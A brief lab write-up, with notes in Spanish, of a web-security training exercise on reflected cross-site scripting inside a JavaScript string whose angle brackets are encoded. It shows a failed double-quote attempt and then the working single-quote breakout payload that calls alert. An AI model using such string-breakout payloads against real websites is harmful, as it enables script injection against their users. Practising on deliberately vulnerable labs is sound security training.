# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

```jsx
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
```

![image.png](Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20an%201891d0419f4a4742a196a0e6ca55186c/image.png)

```jsx
"-alert(1)-"
Vemos que nos bloquea, por que el termino de busqueda está dentro de '
```

![image.png](Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20an%201891d0419f4a4742a196a0e6ca55186c/image%201.png)

```jsx
'-alert(1)-'
```

![image.png](Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20an%201891d0419f4a4742a196a0e6ca55186c/image%202.png)

![image.png](Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20an%201891d0419f4a4742a196a0e6ca55186c/image%203.png)

![image.png](Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20an%201891d0419f4a4742a196a0e6ca55186c/image%204.png)